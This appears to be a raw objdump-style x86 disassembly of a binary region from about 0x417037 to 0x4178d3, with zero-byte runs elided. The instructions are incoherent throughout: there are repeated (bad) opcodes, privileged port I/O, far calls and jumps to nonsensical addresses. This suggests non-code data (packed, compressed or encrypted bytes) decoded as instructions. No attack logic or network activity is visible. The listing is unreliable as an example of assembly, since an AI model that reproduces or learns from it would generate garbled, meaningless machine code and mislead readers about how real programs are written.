  417037:	and    DWORD PTR [ecx-0x4c],esi
  41703a:	push   es
  41703b:	das    
  41703c:	pop    esp
  41703d:	jnp    0x417051
  41703f:	xor    al,0x63
  417041:	imul   edx,DWORD PTR [edx],0x22
  417044:	pop    esp
  417045:	mov    edx,es
  417047:	inc    esi
  417048:	aas    
  417049:	shl    BYTE PTR [esi-0xa],cl
  41704c:	xor    DWORD PTR [esi-0x4ad0b98a],edi
  417052:	add    bl,BYTE PTR [ecx]
  417054:	out    dx,eax
  417055:	mov    ah,0xef
  417057:	adc    esi,ebp
  417059:	mov    ebp,0x99f4aa44
  41705e:	in     eax,0xa3
  417060:	not    DWORD PTR [eax-0x70ba040c]
  417066:	repnz cmc 
  417068:	lock xchg esi,eax
  41706a:	inc    ebx
  41706b:	mov    ah,0x3
  41706d:	cmp    ch,BYTE PTR [ecx]
  41706f:	mov    edx,0x972e4126
  417074:	xor    BYTE PTR ds:0x41ed9a30,dh
  41707a:	sub    BYTE PTR [eax-0x65d3e5fd],al
  417080:	add    DWORD PTR es:[edi],ebp
  417083:	ja     0x417072
  417085:	or     DWORD PTR ds:0x390,esp
	...
  41709b:	add    BYTE PTR [eax],al
  41709d:	add    cl,ah
  41709f:	dec    esi
  4170a0:	xchg   edi,eax
  4170a1:	push   ebp
  4170a2:	adc    bh,BYTE PTR [eax+ecx*4]
  4170a5:	and    al,0x4
  4170a7:	xor    DWORD PTR ds:0xe732fb26,edx
  4170ad:	inc    ebp
  4170ae:	rcl    DWORD PTR [edx+0x3d],cl
  4170b1:	sub    eax,0x274623d8
  4170b6:	aad    0xe4
  4170b8:	aaa    
  4170b9:	and    DWORD PTR [edi-0x3fd3e6aa],esp
  4170bf:	and    al,0x46
  4170c1:	push   ecx
  4170c2:	rcr    BYTE PTR [ebx+esi*1],cl
  4170c5:	out    dx,al
  4170c6:	(bad)  
  4170c7:	and    eax,0x31c10414
  4170cc:	sbb    dh,cl
  4170ce:	jp     0x4170ee
  4170d0:	add    esi,DWORD PTR [eax]
  4170d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d3:	inc    esp
  4170d4:	cmp    dl,BYTE PTR [ecx+0x7a]
  4170d7:	dec    ebx
  4170d8:	adc    eax,0x2d029b2b
  4170dd:	push   ecx
  4170de:	jbe    0x417135
  4170e0:	add    BYTE PTR [edx],bl
  4170e2:	shl    DWORD PTR [ecx],cl
  4170e4:	je     0x4170eb
  4170e6:	retf   0x6e2f
  4170e9:	jmp    0xab92c450
  4170ee:	lds    esi,FWORD PTR [ebx]
  4170f0:	arpl   WORD PTR [edi],bx
  4170f2:	fist   WORD PTR [esi+0x44]
  4170f5:	les    eax,FWORD PTR [edi+0x66cc6427]
  4170fb:	xor    DWORD PTR [esi-0x39],esp
  4170fe:	xor    DWORD PTR [eax],0x9a00
	...
  417114:	add    BYTE PTR [eax],al
  417116:	add    BYTE PTR [ecx+0x43],ch
  417119:	inc    edi
  41711a:	xchg   ebp,eax
  41711b:	popa   
  41711c:	dec    ecx
  41711d:	pop    ebp
  41711e:	scas   eax,DWORD PTR es:[edi]
  41711f:	jbe    0x417142
  417121:	arpl   WORD PTR [eax-0x1694de90],si
  417127:	hlt    
  417128:	dec    ebx
  417129:	das    
  41712a:	fdivr  st,st(3)
  41712c:	aas    
  41712d:	arpl   WORD PTR [ebp-0x23],di
  417130:	and    al,0x74
  417132:	test   dh,dl
  417134:	and    al,0x5f
  417136:	test   edi,ebp
  417138:	and    DWORD PTR [edi-0x66],esi
  41713b:	enter  0x7427,0xe9
  41713f:	aam    0x4b
  417141:	das    
  417142:	sbb    ah,cl
  417144:	cmc    
  417145:	jb     0x4171a4
  417147:	xchg   ebx,eax
  417148:	and    DWORD PTR [esi+0x55],ebp
  41714b:	mov    ah,BYTE PTR [ebx]
  41714d:	pop    edi
  41714e:	cmp    eax,0x32500286
  417153:	push   edx
  417154:	in     al,0x50
  417156:	sub    eax,0x444457d9
  41715b:	xor    BYTE PTR [eax],0x77
  41715e:	sbb    DWORD PTR [edi+0x2],esi
  417161:	push   eax
  417162:	xor    dh,BYTE PTR [edx]
  417164:	in     al,0x5c
  417166:	das    
  417167:	fldenv [ecx]
  417169:	arpl   WORD PTR [edx],di
  41716b:	iret   
  41716c:	daa    
  41716d:	je     0x41716f
  41716f:	inc    BYTE PTR [eax]
  417171:	add    BYTE PTR [eax],al
  417173:	inc    BYTE PTR [eax]
  417175:	add    BYTE PTR [eax],al
  417177:	push   cs
  417178:	add    DWORD PTR [eax],eax
	...
  41718e:	add    BYTE PTR [eax],al
  417190:	push   cs
  417191:	add    DWORD PTR [eax],eax
  417193:	add    dh,bh
  417195:	add    BYTE PTR [eax],al
  417197:	add    dh,bh
  417199:	add    BYTE PTR [eax],al
  41719b:	add    dh,cl
  41719d:	add    BYTE PTR [eax],al
  41719f:	add    dh,cl
  4171a1:	add    BYTE PTR [eax],al
  4171a3:	add    BYTE PTR [esi-0x258e9100],bh
  4171a9:	in     eax,0x73
  4171ab:	gs mov ebp,0xfa6c61aa
  4171b1:	add    BYTE PTR [edi+0x71],ch
  4171b4:	sbb    ah,dh
  4171b6:	jae    0x41721d
  4171b8:	int    0x57
  4171ba:	imul   esi,DWORD PTR [eax+0x33],0xffffffea
  4171be:	push   DWORD PTR [edx+0x3f]
  4171c1:	fsub   QWORD PTR [esp+esi*2+0x23]
  4171c5:	lods   eax,DWORD PTR ds:[esi]
  4171c6:	pop    esp
  4171c7:	arpl   WORD PTR [edx],bx
  4171c9:	jmp    0xedcfd73c
  4171ce:	ins    BYTE PTR es:[edi],dx
  4171cf:	ins    BYTE PTR es:[edi],dx
  4171d0:	daa    
  4171d1:	in     al,0x60
  4171d3:	xor    ebp,ecx
  4171d5:	out    dx,al
  4171d6:	jno    0x41723d
  4171d8:	into   
  4171d9:	fnsave [ecx+0x65]
  4171dc:	dec    esi
  4171dd:	in     eax,dx
  4171de:	ins    BYTE PTR es:[edi],dx
  4171df:	ins    BYTE PTR es:[edi],dx
  4171e0:	out    0xf2,eax
  4171e2:	pusha  
  4171e3:	xor    ecx,DWORD PTR [ecx-0x719a8c15]
  4171e9:	(bad)  
  4171ea:	outs   dx,BYTE PTR ds:[esi]
  4171eb:	jno    0x4171d7
  4171ed:	in     eax,0x73
  4171ef:	gs cmp eax,0x6f5f59
	...
  417209:	call   0x74dc:0x696e68f1
  417210:	je     0x4171b9
  417212:	push   es
  417213:	xor    eax,0x281a9400
  417218:	addr16 fwait
  41721a:	push   es
  41721b:	cmc    
  41721c:	pop    esp
  41721d:	test   BYTE PTR [eax+ebp*1],al
  417220:	jae    0x4171b4
  417222:	sti    
  417223:	pop    eax
  417224:	bound  ecx,QWORD PTR [ebx-0x58ffdc4c]
  41722a:	into   
  41722b:	sub    bh,BYTE PTR [edx+0x74]
  41722e:	fisub  DWORD PTR ds:0xf6c65b67
  417234:	sub    eax,0x257543
  417239:	push   esp
  41723a:	jp     0x417261
  41723c:	addr16 push ebx
  41723e:	mov    esi,0x79505cf6
  417243:	and    BYTE PTR [esi-0x59],ch
  417246:	js     0x41727c
  417248:	ins    BYTE PTR es:[edi],dx
  417249:	ds xchg ebp,eax
  41724b:	and    BYTE PTR [ecx],dh
  41724d:	dec    eax
  41724e:	mov    BYTE PTR ds:0x187146d,ah
  417254:	jno    0x41726c
  417256:	ss sub al,0x74
  417259:	or     bh,BYTE PTR [ecx+0x5a]
  41725c:	jo     0x417273
  41725e:	jg     0x417291
  417260:	pop    edi
  417261:	cmc    
  417262:	xchg   BYTE PTR [ecx],al
  417264:	jno    0x41725c
  417266:	xor    eax,0x190a742c
  41726b:	push   edi
  41726c:	jno    0x41726e
	...
  417282:	repz ds xor al,0x0
  417286:	aam    0x5a
  417288:	sub    BYTE PTR [edi-0x2d],ah
  41728b:	ds repz pop esp
  41728e:	les    ecx,FWORD PTR [eax+ebp*1+0x73]
  417292:	mov    edx,0xbe625743
  417297:	cmc    
  417298:	sbb    al,0x71
  41729a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41729b:	clc    
  41729c:	xor    BYTE PTR [esi+edi*4+0x2],ch
  4172a0:	sbb    ebx,DWORD PTR [edi]
  4172a2:	jbe    0x4172f7
  4172a4:	or     ch,BYTE PTR [ecx]
  4172a6:	xchg   ebx,eax
  4172a7:	sub    eax,0x207a2a04
  4172ac:	sti    
  4172ad:	sub    BYTE PTR [ebp-0x58fc18fe],al
  4172b3:	add    ah,bh
  4172b5:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4172bb:	add    ah,bh
  4172bd:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4172c3:	add    ah,bh
  4172c5:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4172cb:	add    ah,bh
  4172cd:	add    esp,DWORD PTR [edi+0x5533e702]
  4172d3:	and    eax,ebp
  4172d5:	sub    dl,BYTE PTR [ebx+0x1d]
  4172d8:	mov    edx,0xc02441e9
  4172dd:	add    edx,DWORD PTR [edi+0x30]
  4172e0:	xchg   esi,eax
  4172e1:	and    DWORD PTR [eax+0x26],eax
  4172e4:	test   BYTE PTR [ebx],al
	...
  4172fa:	add    al,ch
  4172fc:	xor    eax,0x240b1eb9
  417301:	xchg   ebx,eax
  417302:	sub    bl,BYTE PTR [ecx]
  417304:	sub    bh,ah
  417306:	push   ebx
  417307:	call   0xd7450242
  41730c:	and    edi,DWORD PTR [ebx+0x2b]
  41730f:	shl    DWORD PTR [ecx],cl
  417311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417312:	cmp    eax,DWORD PTR [ebx+eax*1]
  417315:	pop    edx
  417316:	sub    eax,DWORD PTR [edx]
  417318:	and    DWORD PTR [esi+0x2a],ecx
  41731b:	(bad)  
  41731c:	loopne 0x417377
  41731e:	xor    ecx,ebx
  417320:	sbb    edx,DWORD PTR [ebx+0x1f]
  417323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417324:	xor    eax,0x21b92150
  417329:	dec    ebp
  41732a:	xor    eax,0x31003691
  41732f:	ja     0x417333
  417331:	jno    0x417373
  417333:	xchg   BYTE PTR [eax],ah
  417335:	ins    DWORD PTR es:[edi],dx
  417336:	pop    ss
  417337:	jb     0x41732d
  417339:	sub    eax,0x36e315
  41733e:	sbb    cl,ah
  417340:	daa    
  417341:	outs   dx,BYTE PTR ds:[esi]
  417342:	(bad)  
  417343:	mov    esi,0xb8d73133
  417348:	sub    dh,BYTE PTR [ecx+ebp*8+0xb]
  41734c:	hlt    
  41734d:	pusha  
  41734e:	jmp    0xe9a56756
  417353:	or     esi,esp
  417355:	(bad)  
  417356:	jmp    0xa48db8ae
  41735b:	imul   edx,DWORD PTR [esi+0x20],0xffffffc1
	...
  417373:	add    BYTE PTR [edi-0x7a408bcd],cl
  417379:	sbb    eax,0x24c31563
  41737e:	outs   dx,BYTE PTR ds:[esi]
  41737f:	retf   0x397a
  417382:	jo     0x417341
  417384:	cdq    
  417385:	es push ebx
  417387:	mov    edx,0x886e3491
  41738c:	and    DWORD PTR ds:0x20c1c92c,0x32dd9b61
  417396:	je     0x41731c
  417398:	mov    al,0x52
  41739a:	pop    edi
  41739b:	jp     0x417370
  41739d:	aaa    
  41739e:	ins    DWORD PTR es:[edi],dx
  41739f:	jnp    0x417341
  4173a1:	loop   0x4173e8
  4173a3:	fwait
  4173a4:	out    dx,eax
  4173a5:	cmp    eax,0x2cbf7c20
  4173aa:	pop    ebp
  4173ab:	push   ebp
  4173ac:	shl    BYTE PTR [edi],0x67
  4173af:	dec    edi
  4173b0:	xchg   esp,eax
  4173b1:	add    al,BYTE PTR [esi+0x40]
  4173b4:	xchg   ebp,eax
  4173b5:	and    eax,0x2933e66
  4173ba:	pop    esp
  4173bb:	add    BYTE PTR [ebx-0xd968617],dl
  4173c1:	ficomp DWORD PTR [esp+ebx*2-0x78]
  4173c5:	fbstp  TBYTE PTR [ecx+0x65]
  4173c8:	call   0x3e9debb6
  4173cd:	push   esp
  4173ce:	imul   esp,DWORD PTR [esi-0x46],0xffffffe1
  4173d2:	pop    esp
  4173d3:	jb     0x417380
  4173d5:	dec    edx
  4173d6:	dec    ecx
  4173d7:	outs   dx,DWORD PTR ds:[esi]
	...
  4173ec:	add    BYTE PTR [edi+ebx*8+0x69f6c6b],dh
  4173f3:	sub    DWORD PTR ds:0x746604f3,ebp
  4173f9:	(bad)  
  4173fa:	stos   BYTE PTR es:[edi],al
  4173fb:	sub    al,0x2f
  4173fd:	(bad)  
  4173fe:	fdiv   QWORD PTR [ebx+0x74]
  417401:	into   
  417402:	stos   BYTE PTR es:[edi],al
  417403:	sub    al,0x2f
  417405:	into   
  417406:	fdiv   QWORD PTR [ebx+0x74]
  417409:	(bad)  
  41740a:	repz cmp DWORD PTR [edi],ebp
  41740d:	rol    DWORD PTR [esi+eiz*2],1
  417410:	je     0x417420
  417412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417413:	std    
  417414:	xlat   BYTE PTR gs:[ebx]
  417416:	repnz pusha 
  417418:	inc    esi
  417419:	sbb    dl,BYTE PTR [ebp+0x6f]
  41741c:	imul   edi,edx,0x1a2e6ee1
  417422:	out    0x73,al
  417424:	add    BYTE PTR [ebp-0x1d],bl
  417427:	pop    esp
  417428:	dec    ebp
  417429:	and    esi,esp
  41742b:	data16 gs aaa 
  41742e:	add    al,0x5c
  417430:	dec    ebp
  417431:	xor    edx,ebp
  417433:	fs ins BYTE PTR es:[edi],dx
  417435:	xor    ah,bh
  417437:	pop    ebx
  417438:	push   ebx
  417439:	sub    esp,edi
  41743b:	dec    eax
  41743c:	outs   dx,DWORD PTR ds:[esi]
  41743d:	lock fsub QWORD PTR [eax+0x79]
  417441:	loop   0x417449
  417443:	inc    esi
  417444:	ins    BYTE PTR es:[edi],dx
  417445:	icebp  
  417446:	jecxz  0x4174ae
  417448:	add    BYTE PTR [edi-0x3f93c20b],ah
  41744e:	cmp    al,0x29
  417450:	pop    esp
	...
  417465:	add    ch,ah
  417467:	jmp    0x41748d
  417469:	jne    0x41741f
  41746b:	inc    esi
  41746c:	xor    bl,BYTE PTR [edi+eiz*4-0x1a]
  417470:	and    al,0x7a
  417472:	mov    esi,0xa75f27ed
  417477:	inc    ebp
  417478:	inc    edi
  417479:	ins    DWORD PTR es:[edi],dx
  41747a:	popf   
  41747b:	adc    ch,BYTE PTR [eax]
  41747d:	ins    BYTE PTR es:[edi],dx
  41747e:	xchg   ch,dh
  417480:	push   ebx
  417481:	jb     0x417403
  417483:	pop    es
  417484:	sub    ebp,DWORD PTR [edx+eax*4-0x54]
  417488:	push   ebp
  417489:	add    BYTE PTR [eax+eax*1+0x1e],dl
  41748d:	je     0x4174ff
  41748f:	cli    
  417490:	xor    DWORD PTR [ebx+0x53],esp
  417493:	or     eax,0xd184631f
  417498:	cmp    edx,DWORD PTR [edi+esi*2-0x67]
  41749c:	inc    esp
  41749d:	jo     0x4174f6
  41749f:	pop    ebp
  4174a0:	sub    al,0x72
  4174a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174a3:	lea    esp,[esi]
  4174a5:	popa   
  4174a6:	inc    esi
  4174a7:	aad    0x3d
  4174a9:	addr16 xor eax,0x486d1f99
  4174af:	les    ebp,FWORD PTR [eax]
  4174b1:	pop    edi
  4174b2:	xor    eax,0x4663e3c4
  4174b7:	lea    eax,[ecx]
  4174b9:	push   ecx
  4174ba:	push   cs
  4174bb:	xchg   esi,eax
  4174bc:	and    BYTE PTR [edi+0x9],al
  4174bf:	and    BYTE PTR [esi],0x2e
  4174c2:	mul    BYTE PTR [edi+0x51]
  4174c5:	add    al,bl
  4174c7:	jge    0x4174f5
  4174c9:	outs   dx,BYTE PTR ds:[esi]
	...
  4174de:	add    BYTE PTR [edi+0x8762467],ah
  4174e4:	sub    al,0x2c
  4174e6:	je     0x4174f2
  4174e8:	sub    eax,0x30663e3
  4174ed:	pop    ebx
  4174ee:	add    al,0xfa
  4174f0:	sbb    DWORD PTR [ebp+0x3e],ecx
  4174f3:	repz push edx
  4174f5:	out    0x30,eax
  4174f7:	enter  0x4436,0x31
  4174fb:	jns    0x417523
  4174fd:	dec    ecx
  4174fe:	add    al,0xe6
  417500:	sbb    cl,BYTE PTR ds:[ebx-0x1d]
  417504:	dec    esi
  417505:	xor    dh,bl
  417507:	add    DWORD PTR [ebx-0x8],0xd7f6723f
  41750e:	out    0xe1,al
  417510:	jmp    0xf20db6e8
  417515:	xlat   BYTE PTR ds:[ebx]
  417516:	pop    ds
  417517:	aad    0xdd
  417519:	into   
  41751a:	inc    edx
  41751b:	iret   
  41751c:	repnz shl ebx,cl
  41751f:	shr    dl,1
  417521:	mov    dh,0x42
  417523:	arpl   WORD PTR [edx+edi*4-0xf],ax
  417527:	push   0x48
  417529:	mov    bl,0x36
  41752b:	dec    ebx
  41752c:	cmp    ebp,edx
  41752e:	push   ebx
  41752f:	push   ebp
  417530:	pop    ds
  417531:	retf   0x4450
  417534:	xor    al,0xdd
  417536:	push   ds
  417537:	push   ebp
  417538:	repz sbb BYTE PTR [esi+edx*2],al
  41753c:	and    eax,0x34442db9
  417541:	mov    edx,0xe5
	...
  417556:	add    BYTE PTR [eax],al
  417558:	xor    BYTE PTR ds:0x485303c3,bl
  41755e:	xchg   ebx,eax
  41755f:	push   ebx
  417560:	bound  esp,QWORD PTR ds:0x31042f9b
  417566:	out    0x3e,eax
  417568:	not    BYTE PTR [esi-0x75]
  41756b:	and    ebp,edx
  41756d:	fadd   QWORD PTR [edx-0x67fcecde]
  417573:	aas    
  417574:	loopne 0x4175ac
  417576:	mov    ch,ah
  417578:	add    al,0x24
  41757a:	add    BYTE PTR [ebp-0x5c],bh
  41757d:	dec    esi
  41757e:	inc    ebx
  41757f:	jp     0x417539
  417581:	xor    ebp,DWORD PTR [ebp+0x4f]
  417584:	xchg   edi,eax
  417585:	dec    esi
  417586:	aas    
  417587:	sub    eax,0xe9505699
  41758c:	fstp   QWORD PTR [esp+esi*2]
  41758f:	inc    esp
  417590:	xchg   ebp,eax
  417591:	sbb    al,0x63
  417593:	cmp    eax,0x3978414b
  417598:	(bad)  
  417599:	pop    ds
  41759a:	jb     0x4175e8
  41759c:	jne    0x4175a0
  41759e:	push   ebp
  41759f:	inc    eax
  4175a0:	and    DWORD PTR ds:0x43d70c6e,0x21cb0a5f
  4175aa:	inc    ecx
  4175ab:	sbb    esi,DWORD PTR [eax-0x47009cda]
  4175b1:	and    eax,0x2b6155f
  4175b6:	dec    ebx
  4175b7:	sbb    al,BYTE PTR [ebx]
  4175b9:	inc    ebp
  4175ba:	inc    ebx
  4175bb:	leave  
	...
  4175d0:	add    BYTE PTR [edx+0x54c95056],dh
  4175d6:	dec    ebp
  4175d7:	jno    0x4175b3
  4175d9:	xchg   ebx,eax
  4175da:	pop    ds
  4175db:	jb     0x4175a2
  4175dd:	xchg   edi,eax
  4175de:	add    al,BYTE PTR [ecx+edi*4+0x65]
  4175e2:	push   edx
  4175e3:	inc    edi
  4175e4:	adc    eax,ebx
  4175e6:	lods   eax,DWORD PTR ds:[esi]
  4175e7:	ins    DWORD PTR es:[edi],dx
  4175e8:	mov    edx,0xc4721f90
  4175ed:	xchg   esp,ebx
  4175ef:	arpl   bp,ax
  4175f1:	mov    BYTE PTR [edx],al
  4175f3:	push   eax
  4175f4:	call   0x30e7:0x8c721f78
  4175fb:	arpl   WORD PTR [eax-0x78b8de38],cx
  417601:	xlat   BYTE PTR ds:[ebx]
  417602:	ss pop edi
  417604:	jg     0x4175cd
  417606:	and    DWORD PTR [eax],eax
  417608:	add    BYTE PTR [esi-0x1868e1e],cl
  41760e:	(bad)  [esi]
  417610:	xor    ch,BYTE PTR [eax+0xd]
  417613:	ins    BYTE PTR es:[edi],dx
  417614:	ins    BYTE PTR es:[edi],dx
  417615:	jle    0x417659
  417617:	jb     0x417692
  417619:	(bad)  
  41761a:	jmp    0x746a:0xf4fe6e50
  417621:	jecxz  0x417608
  417623:	jae    0x417669
  417625:	fucomip st,st(2)
  417627:	pop    esp
  417628:	add    BYTE PTR [esi+0x1],cl
  41762b:	add    BYTE PTR [eax],al
  41762d:	dec    esi
  41762e:	add    DWORD PTR [eax],eax
  417630:	add    BYTE PTR [esi],bh
  417632:	add    DWORD PTR [eax+0x4a],eax
	...
  417649:	add    BYTE PTR [ecx],dh
  41764b:	popf   
  41764c:	loope  0x417608
  41764e:	pop    ecx
  41764f:	pop    ss
  417650:	mov    ebx,0x4f0e7d
  417655:	imul   eax,eax,0xf14a3d60
  41765b:	pushf  
  41765c:	loope  0x417618
  41765e:	cmp    DWORD PTR [edi],edx
  417660:	mov    ebx,0x4f0e7d
  417665:	imul   eax,eax,0x314a4260
  41766b:	popf   
  41766c:	loope  0x417628
  41766e:	cdq    
  41766f:	pop    ss
  417670:	mov    ebx,0x4ece7d
  417675:	imul   eax,DWORD PTR [eax],0xbe003b63
  41767b:	add    BYTE PTR [ecx],ah
  41767d:	xor    BYTE PTR [eax+edi*1-0x2516ad00],bh
  417684:	jae    0x4176fd
  417686:	fcomip st,st(6)
  417688:	pusha  
  417689:	pop    esp
  41768a:	or     ecx,DWORD PTR [esi]
  41768c:	pop    edi
  41768d:	jb     0x4176c8
  41768f:	cmc    
  417690:	push   0x66
  417692:	xor    bh,BYTE PTR [eax*2+0x288da76e]
  417699:	jb     0x417694
  41769b:	xchg   BYTE PTR ds:0x3181ea20,dh
  4176a1:	ins    BYTE PTR es:[edi],dx
  4176a2:	or     BYTE PTR [eax],ch
  4176a4:	sub    BYTE PTR [edx-0x2d],dh
  4176a7:	bound  ebx,QWORD PTR [edi]
  4176a9:	je     0x4176ad
  4176ab:	cs sbb eax,0x67
	...
  4176c1:	add    BYTE PTR [eax],al
  4176c3:	jmp    0xd4acad1c
  4176c8:	in     eax,dx
  4176c9:	push   esp
  4176ca:	je     0x41768c
  4176cc:	inc    edi
  4176cd:	and    esp,DWORD PTR [ebp-0x3e]
  4176d0:	pop    es
  4176d1:	add    al,0x0
  4176d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d4:	cdq    
  4176d5:	add    DWORD PTR [edi-0x59],ebx
  4176d8:	aaa    
  4176d9:	add    al,0x63
  4176db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176dd:	add    DWORD PTR [eax],edi
  4176df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176e0:	mov    bl,0x1
  4176e2:	aaa    
  4176e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176e4:	sti    
  4176e5:	add    ebp,DWORD PTR [ebx]
  4176e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176e8:	mov    ds:0xcda76201,al
  4176ed:	add    DWORD PTR ds:0x34016ea7,esi
  4176f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176f4:	clc    
  4176f5:	add    esp,DWORD PTR [edi+eiz*4-0x3e]
  4176f9:	add    DWORD PTR [ebx],ebp
  4176fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176fc:	cli    
  4176fd:	add    esi,DWORD PTR [ecx]
  4176ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417700:	jbe    0x417703
  417702:	cmp    BYTE PTR [edi-0x589efbea],ah
  417708:	pop    es
  417709:	add    al,0x32
  41770b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41770c:	adc    al,BYTE PTR [eax+esi*1]
  41770f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417710:	adc    eax,0xb7a76404
  417715:	add    DWORD PTR [edi-0x59],ebx
  417718:	mov    ah,0x1
  41771a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41771c:	lods   al,BYTE PTR ds:[esi]
  41771d:	add    DWORD PTR [eax],eax
  41771f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417720:	mov    ds,WORD PTR [ecx+eiz*2]
  417723:	adc    eax,0x369603
	...
  41773c:	or     ah,BYTE PTR ds:0x19fa5293
  417742:	test   DWORD PTR [ecx+edi*8],edi
  417745:	and    eax,0x2cd5293
  41774a:	lea    esi,[edi]
  41774c:	imul   eax
  41774e:	int    0xe2
  417750:	jo     0x4177a2
  417752:	xchg   BYTE PTR [ecx],ch
  417754:	repz xor ecx,DWORD PTR [eax+0x284ec435]
  41775b:	sub    dl,cl
  41775d:	and    BYTE PTR [eax+edx*2-0x1a],al
  417761:	sbb    eax,DWORD PTR [edi+ebx*1-0x46]
  417765:	sbb    al,0xe7
  417767:	push   esp
  417768:	enter  0x4c36,0x55
  41776c:	les    esi,FWORD PTR [eax]
  41776e:	xor    eax,0xe72fb527
  417773:	push   esp
  417774:	shl    BYTE PTR [esi],0x44
  417777:	push   ebp
  417778:	test   BYTE PTR [eax],dh
  41777a:	sbb    eax,0xc3e29527
  41777f:	daa    
  417780:	jae    0x4177bc
  417782:	push   es
  417783:	xor    eax,0x1b3a0293
  417788:	jnp    0x4177af
  41778a:	sbb    ah,BYTE PTR [edi]
  41778c:	jne    0x4177c2
  41778e:	add    al,0x36
  417790:	(bad)  
  417791:	in     eax,0xa
  417793:	push   eax
  417794:	push   edx
  417795:	and    eax,0x1e555709
  41779a:	out    0x54,eax
  41779c:	inc    eax
  41779d:	les    edx,FWORD PTR ss:[eax+eax*1+0x0]
	...
  4177b2:	add    BYTE PTR [eax],al
  4177b4:	add    BYTE PTR [eax+esi*1-0x23],al
  4177b8:	es push ebp
  4177ba:	loop   0x4177bf
  4177bc:	sub    BYTE PTR [ebx+0x50],ah
  4177bf:	int3   
  4177c0:	push   ds
  4177c1:	dec    edx
  4177c2:	(bad)
  4177c7:	add    BYTE PTR [ebx-0x418bde7f],bh
  4177cd:	fidiv  DWORD PTR [ecx]
  4177cf:	add    BYTE PTR [edx-0x459cd143],bh
  4177d5:	leave  
  4177d6:	xor    al,0x76
  4177d8:	mov    edx,ss
  4177da:	loop   0x4177fe
  4177dc:	test   DWORD PTR [ecx+0x55],esp
  4177df:	jno    0x41776d
  4177e1:	mov    dl,0x2
  4177e3:	push   ecx
  4177e4:	nop
  4177e5:	mov    eax,0xb28c5125
  4177ea:	xor    BYTE PTR [ebx+0x7b],ah
  4177ed:	inc    esp
  4177ee:	in     eax,0x63
  4177f0:	adc    al,0xf0
  4177f2:	xor    esp,DWORD PTR [ebx+0x5b]
  4177f5:	dec    ebx
  4177f6:	cmp    dl,BYTE PTR [ebp-0x17]
  4177f9:	inc    ecx
  4177fa:	xor    ebx,DWORD PTR [edx+eiz*1-0x78]
  4177fe:	xor    DWORD PTR [ecx+0x51],esp
  417801:	test   BYTE PTR [ecx],ah
  417803:	outs   dx,BYTE PTR ds:[esi]
  417804:	jmp    0x4cb599e4
  417809:	shl    BYTE PTR ds:0x34c83772,cl
  41780f:	and    ah,cl
  417811:	rol    BYTE PTR [esi+0x51],0x27
  417815:	outs   dx,DWORD PTR ds:[esi]
  417816:	push   edx
  417817:	add    BYTE PTR ds:0x0,ch
	...
  41782d:	add    al,al
  41782f:	push   ss
  417830:	jae    0x417843
  417832:	enter  0x5440,0x19
  417836:	mov    ds:0xc9f56733,eax
  41783b:	xor    ebp,DWORD PTR [esi]
  41783d:	icebp  
  41783e:	mov    DWORD PTR [esi],edx
  417840:	add    BYTE PTR [esi],dl
  417842:	mov    BYTE PTR [eax+eiz*1],ah
  417845:	lods   eax,DWORD PTR ds:[esi]
  417846:	test   DWORD PTR [esi],ebp
  417848:	pop    edi
  417849:	jmp    0xc0a68fde
  41784e:	xchg   dl,ah
  417850:	inc    ebx
  417851:	enter  0x4978,0x0
  417855:	add    BYTE PTR ds:0xfa694c55,bl
  41785b:	loopne 0x41787c
  41785d:	data16 loope 0x41784f
  417860:	push   0x30a55a61
  417865:	add    BYTE PTR [edx],bh
  417867:	in     al,0x61
  417869:	ins    BYTE PTR es:[edi],dx
  41786a:	sub    eax,DWORD PTR ds:0x5670028
  417870:	and    BYTE PTR [eax],al
  417872:	dec    ebp
  417873:	inc    edx
  417874:	dec    esi
  417875:	push   ebx
  417876:	sbb    cl,BYTE PTR [edi+0x3d]
  417879:	dec    ecx
  41787a:	inc    eax
  41787b:	push   ecx
  41787c:	add    BYTE PTR [eax+0xc],dl
  41787f:	in     al,dx
  417880:	dec    eax
  417881:	inc    ecx
  417882:	cmp    al,0x3c
  417884:	add    BYTE PTR [ebp-0x70],dl
  417887:	out    0x4c,eax
  417889:	push   ebp
  41788a:	mov    edi,esi
  41788c:	ds dec eax
  41788e:	jnp    0x4178d5
  417890:	inc    edi
	...
  4178a5:	add    BYTE PTR [eax],al
  4178a7:	mov    cl,ch
  4178a9:	push   ecx
  4178aa:	inc    ebp
  4178ab:	ja     0x4178ee
  4178ad:	dec    esi
  4178ae:	add    BYTE PTR [esi],bh
  4178b0:	or     DWORD PTR [ebx+0x67],ebp
  4178b3:	out    0x8,eax
  4178b5:	outs   dx,DWORD PTR ds:[esi]
  4178b6:	add    cl,ah
  4178b8:	hlt    
  4178b9:	fs addr16 mov bh,0x8
  4178bd:	pop    ebx
  4178be:	jne    0x41786c
  4178c0:	loop   0x4178c1
  4178c2:	outs   dx,DWORD PTR ds:[esi]
  4178c3:	lahf   
  4178c4:	cmc    
  4178c5:	outs   dx,BYTE PTR ds:[esi]
  4178c6:	ja     0x4178c9
  4178c8:	repz arpl WORD PTR [edi-0x8],bx
  4178cc:	(bad)  [ebx+0x75]
  4178cf:	stos   DWORD PTR es:[edi],eax
  4178d0:	(bad)  
  4178d1:	jo     0x417946
  4178d3:	fwait
